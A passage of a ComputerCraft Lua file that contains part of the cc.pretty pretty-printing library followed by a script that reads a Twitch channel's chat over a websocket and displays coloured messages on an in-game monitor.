        local out = setmetatable({ tag = ""concat"", n = doc.n }, Doc)
        for i = 1, doc.n do out[i] = flatten(doc[i]) end
        doc.flat, out.flat = out, out -- cache the flattened node
        return out
    elseif kind == ""nest"" then
        return flatten(doc[1])
    elseif kind == ""group"" then
        return doc[1]
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Builds a document which is displayed on a single line if there is enough
-- room, or as normal if not.
--
-- @tparam Doc doc The document to group.
-- @treturn Doc The grouped document.
-- @usage Uses group to show things being displayed on one or multiple lines.
--
--     local pretty = require ""cc.pretty""
--     local doc = pretty.group(""Hello"" .. pretty.space_line .. ""World"")
--     print(pretty.render(doc, 5)) -- On multiple lines
--     print(pretty.render(doc, 20)) -- Collapsed onto one.
local function group(doc)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end

    if doc.tag == ""group"" then return doc end -- Skip if already grouped.

    local flattened = flatten(doc)
    if flattened == doc then return doc end -- Also skip if flattening does nothing.
    return setmetatable({ tag = ""group"", flattened, doc }, Doc)
end

local function get_remaining(doc, width)
    local kind = doc.tag
    if kind == ""nil"" or kind == ""line"" then
        return width
    elseif kind == ""text"" then
        return width - #doc.text
    elseif kind == ""concat"" then
        for i = 1, doc.n do
            width = get_remaining(doc[i], width)
            if width < 0 then break end
        end
        return width
    elseif kind == ""group"" or kind == ""nest"" then
        return get_remaining(kind[1])
    else
        error(""Unknown doc "" .. kind)
    end
end

--- Display a document on the terminal.
--
-- @tparam      Doc     doc         The document to render
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function write(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")

    local term = term
    local width, height = term.getSize()
    local ribbon_width = (ribbon_frac or 0.6) * width
    if ribbon_width < 0 then ribbon_width = 0 end
    if ribbon_width > width then ribbon_width = width end

    local def_colour = term.getTextColour()
    local current_colour = def_colour

    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            local doc_colour = doc.colour or def_colour
            if doc_colour ~= current_colour then
                term.setTextColour(doc_colour)
                current_colour = doc_colour
            end

            str_write(doc.text)

            return col + #doc.text
        elseif kind == ""line"" then
            local _, y = term.getCursorPos()
            if y < height then
                term.setCursorPos(indent + 1, y + 1)
            else
                term.scroll(1)
                term.setCursorPos(indent + 1, height)
            end

            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    local col = math.max(term.getCursorPos() - 1, 0)
    go(doc, 0, col)
    if current_colour ~= def_colour then term.setTextColour(def_colour) end
end

--- Display a document on the terminal with a trailing new line.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
local function print(doc, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, ribbon_frac, ""number"", ""nil"")
    write(doc, ribbon_frac)
    str_write(""\n"")
end

--- Render a document, converting it into a string.
--
-- @tparam      Doc     doc         The document to render.
-- @tparam[opt] number  width       The maximum width of this document. Note that long strings will not be wrapped to
-- fit this width - it is only used for finding the best layout.
-- @tparam[opt] number  ribbon_frac The maximum fraction of the width that we should write in.
-- @treturn string The rendered document as a string.
local function render(doc, width, ribbon_frac)
    if getmetatable(doc) ~= Doc then expect(1, doc, ""document"") end
    expect(2, width, ""number"", ""nil"")
    expect(3, ribbon_frac, ""number"", ""nil"")

    local ribbon_width
    if width then
        ribbon_width = (ribbon_frac or 0.6) * width
        if ribbon_width < 0 then ribbon_width = 0 end
        if ribbon_width > width then ribbon_width = width end
    end

    local out = { n = 0 }
    local function go(doc, indent, col)
        local kind = doc.tag
        if kind == ""nil"" then
            return col
        elseif kind == ""text"" then
            append(out, doc.text)
            return col + #doc.text
        elseif kind == ""line"" then
            append(out, ""\n"" .. ("" ""):rep(indent))
            return indent
        elseif kind == ""concat"" then
            for i = 1, doc.n do col = go(doc[i], indent, col) end
            return col
        elseif kind == ""nest"" then
            return go(doc[1], indent + doc.depth, col)
        elseif kind == ""group"" then
            if not width or get_remaining(doc[1], math.min(width, ribbon_width + indent) - col) >= 0 then
                return go(doc[1], indent, col)
            else
                return go(doc[2], indent, col)
            end
        else
            error(""Unknown doc "" .. kind)
        end
    end

    go(doc, 0, 0)
    return table.concat(out, """", 1, out.n)
end

Doc.__tostring = render --- @local

local keywords = {
    [""and""] = true, [""break""] = true, [""do""] = true, [""else""] = true,
    [""elseif""] = true, [""end""] = true, [""false""] = true, [""for""] = true,
    [""function""] = true, [""if""] = true, [""in""] = true, [""local""] = true,
    [""nil""] = true, [""not""] = true, [""or""] = true, [""repeat""] = true, [""return""] = true,
    [""then""] = true, [""true""] = true, [""until""] = true, [""while""] = true,
  }

local comma = text("","")
local braces = text(""{}"")
local obrace, cbrace = text(""{""), text(""}"")
local obracket, cbracket = text(""[""), text(""] = "")

local function key_compare(a, b)
    local ta, tb = type(a), type(b)

    if ta == ""string"" then return tb ~= ""string"" or a < b
    elseif tb == ""string"" then return false
    end

    if ta == ""number"" then return tb ~= ""number"" or a < b end
    return false
end

local function show_function(fn, options)
    local info = debug_info and debug_info(fn, ""Su"")

    -- Include function source position if available
    local name
    if options.function_source and info and info.short_src and info.linedefined and info.linedefined >= 1 then
        name = ""function<"" .. info.short_src .. "":"" .. info.linedefined .. "">""
    else
        name = tostring(fn)
    end

    -- Include arguments if a Lua function and if available. Lua will report ""C""
    -- functions as variadic.
    if options.function_args and info and info.what == ""Lua"" and info.nparams and debug_local then
        local args = {}
        for i = 1, info.nparams do args[i] = debug_local(fn, i) or ""?"" end
        if info.isvararg then args[#args + 1] = ""..."" end
        name = name .. ""("" .. table.concat(args, "", "") .. "")""
    end

    return name
end

local function pretty_impl(obj, options, tracking)
    local obj_type = type(obj)
    if obj_type == ""string"" then
        local formatted = (""%q""):format(obj):gsub(""\\\n"", ""\\n"")
        return text(formatted, colours.red)
    elseif obj_type == ""number"" then
        return text(tostring(obj), colours.magenta)
    elseif obj_type == ""function"" then
        return text(show_function(obj, options), colours.lightGrey)
    elseif obj_type ~= ""table"" or tracking[obj] then
        return text(tostring(obj), colours.lightGrey)
    elseif getmetatable(obj) ~= nil and getmetatable(obj).__tostring then
        return text(tostring(obj))
    elseif next(obj) == nil then
        return braces
    else
        tracking[obj] = true
        local doc = setmetatable({ tag = ""concat"", n = 1, space_line }, Doc)

        local length, keys, keysn = #obj, {}, 1
        for k in pairs(obj) do keys[keysn], keysn = k, keysn + 1 end
        table.sort(keys, key_compare)

        for i = 1, keysn - 1 do
            if i > 1 then append(doc, comma) append(doc, space_line) end

            local k = keys[i]
            local v = obj[k]
            local ty = type(k)
            if ty == ""number"" and k % 1 == 0 and k >= 1 and k <= length then
                append(doc, pretty_impl(v, options, tracking))
            elseif ty == ""string"" and not keywords[k] and k:match(""^[%a_][%a%d_]*$"") then
                append(doc, text(k .. "" = ""))
                append(doc, pretty_impl(v, options, tracking))
            else
                append(doc, obracket)
                append(doc, pretty_impl(k, options, tracking))
                append(doc, cbracket)
                append(doc, pretty_impl(v, options, tracking))
            end
        end

        tracking[obj] = nil
        return group(concat(obrace, nest(2, concat(table.unpack(doc, 1, doc.n))), space_line, cbrace))
    end
end

--- Pretty-print an arbitrary object, converting it into a document.
--
-- This can then be rendered with @{write} or @{print}.
--
-- @param obj The object to pretty-print.
-- @tparam[opt] { function_args = boolean, function_source = boolean } options
-- Controls how various properties are displayed.
--  - `function_args`: Show the arguments to a function if known (`false` by default).
--  - `function_source`: Show where the function was defined, instead of
--    `function: xxxxxxxx` (`false` by default).
-- @treturn Doc The object formatted as a document.
-- @usage Display a table on the screen
--     local pretty = require ""cc.pretty""
--     pretty.print(pretty.pretty({ 1, 2, 3 }))
local function prettyf(obj, options)
    expect(2, options, ""table"", ""nil"")
    options = options or {}

    local actual_options = {
        function_source = field(options, ""function_source"", ""boolean"", ""nil"") or false,
        function_args = field(options, ""function_args"", ""boolean"", ""nil"") or false,
    }
    return pretty_impl(obj, actual_options, {})
end

local pretty = {
    empty = empty,
    space = space,
    line = line,
    space_line = space_line,
    text = text,
    concat = concat,
    nest = nest,
    group = group,

    write = write,
    print = print,
    render = render,

    pretty = prettyf,
}

local monitor = peripheral.find(""monitor"")
local oldTerm = term.redirect(monitor)

function split(str, character)
  result = {}
  index = 1
  for s in string.gmatch(str, ""[^""..character..""]+"") do
    result[index] = s
    index = index + 1
  end
  return result
end
local hex = {""F0F0F0"", ""F2B233"", ""E57FD8"", ""99B2F2"", ""DEDE6C"", ""7FCC19"", ""F2B2CC"", ""4C4C4C"", ""999999"", ""4C99B2"", ""B266E5"", ""3366CC"", ""7F664C"", ""57A64E"", ""CC4C4C"", ""191919""}
local rgb = {}
for i=1,16,1 do
  rgb[i] = {tonumber(hex[i]:sub(1, 2), 16), tonumber(hex[i]:sub(3, 4), 16), tonumber(hex[i]:sub(5, 6), 16)}
end
local rgb2 = {}
for i=1,16,1 do
  rgb2[i] = {}
  for j=1,16,1 do
    rgb2[i][j] = {(rgb[i][1] * 34 + rgb[j][1] * 20) / 54, (rgb[i][2] * 34 + rgb[j][2] * 20) / 54, (rgb[i][3] * 34 + rgb[j][3] * 20) / 54}
  end
end
 
colors.fromRGB = function (r, g, b)
  local dist = 1e100
  local d = 1e100
  local color = -1
  for i=1,16,1 do
    d = math.sqrt((math.max(rgb[i][1], r) - math.min(rgb[i][1], r)) ^ 2 + (math.max(rgb[i][2], g) - math.min(rgb[i][2], g)) ^ 2 + (math.max(rgb[i][3], b) - math.min(rgb[i][3], b)) ^ 2)
    if d < dist then
      dist = d
      color = i - 1
    end
  end
  return 2 ^ color
end
 
local ws

function main()
	ws, err = http.websocket(""wss://irc-ws.chat.twitch.tv"")
	if err then
		print(err)
	elseif ws then
		ws.send(""PASS ottomated"")
		ws.send(""NICK justinfan""..math.random(10000, 99999))
		ws.send(""JOIN #""..CHATROOM)
		ws.send(""CAP REQ :twitch.tv/tags"")
		ws.send(""CAP REQ :twitch.tv/commands"")
		while true do
			local msg = ws.receive()
			if msg == ""PING :tmi.twitch.tv"" then
				ws.send(""PONG :tmi.twitch.tv"")
			else
				-- print(msg)
				local parts = split(msg, "" "")
				if parts[3] == ""PRIVMSG"" then
					local twitchParts = split(parts[1], "";"")
					local nameColor = ""#ffffff""
					local displayName
					local subscriber = false
					local founder = false
					local id
					for _, part in ipairs(twitchParts) do
						if string.sub(part, 1, 12) == ""@badge-info="" then
							founder = string.find(part, ""founder"") ~= nil
						elseif string.sub(part, 1, 6) == ""color="" then
							nameColor = string.sub(part, 7, -1)
						elseif string.sub(part, 1, 13) == ""display-name="" then
							displayName = string.sub(part, 14, -1)
						elseif string.sub(part, 1, 3) == ""id="" then
							id = string.sub(part, 4, -1)
						elseif string.sub(part, 1, 11) == ""subscriber="" then
							subscriber = string.sub(part, 12, -1) == ""1""
						end
					end
					subscriber = subscriber or founder
					
					local namePalette
					if #nameColor < 1 then
						namePalette = 2^math.random(0, 15)
					else
						local hex = string.sub(nameColor, 2, -1)
						local r = tonumber(string.sub(hex, 1, 2), 16)
						local g = tonumber(string.sub(hex, 3, 4), 16)
						local b = tonumber(string.sub(hex, 5, 6), 16)
						namePalette = colors.fromRGB(r, g, b)
					end

					if namePalette == colors.black or namePalette == colors.white then
						namePalette = colors.lightGray
					end

					if displayName and id then
						local message = string.sub(parts[5], 2, -1)

						for i=6,#parts do
							message = message.."" ""..parts[i]
						end
						if string.sub(message, 1, 7) == ""ACTION"" then
							message = string.sub(message, 9, -4)
						else
							message = string.sub(message, 1, -2)
						end
						if subscriber or not SUBSONLY then
							pretty.print(pretty.group(pretty.text(displayName, namePalette) .. pretty.text("":"", colors.white) .. pretty.space .. pretty.text(message, colors.white)))
							-- term.setTextColor(namePalette)
							-- term.write(displayName)
							-- term.setCursorPos()
							-- print(displayName, message)
						end
					end
				elseif CLEAR_MESSAGES and (parts[3] == ""CLEARMSG"" or parts[3] == ""CLEARCHAT"") then
					term.clear()
					term.setCursorPos(1,1)
				end
			end
		end
	end
end
while true do
 pcall(main)
 if ws then
	 ws.close()
 end
end
--term.redirect(oldTerm)"
